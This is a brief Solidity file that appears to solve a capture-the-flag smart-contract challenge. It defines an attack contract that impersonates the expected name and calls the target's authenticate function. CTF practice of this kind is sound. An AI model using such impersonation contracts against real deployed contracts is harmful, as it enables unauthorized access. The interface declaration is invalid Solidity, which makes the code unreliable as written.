pragma solidity ^0.4.21;
interface FuzzyIdentityChallenge{
    function authenticate() public {};
}
contract Hack {
    address public identityContract;
    function setIdentityContract(address _actionsContract) public {
        identityContract = _actionsContract;
    }

    function name() external view returns (bytes32) {
        return bytes32("smarx");
    }
    function auth() public { //have to create an interface here!!
        FuzzyIdentityChallenge(identityContract).authenticate();
    }
}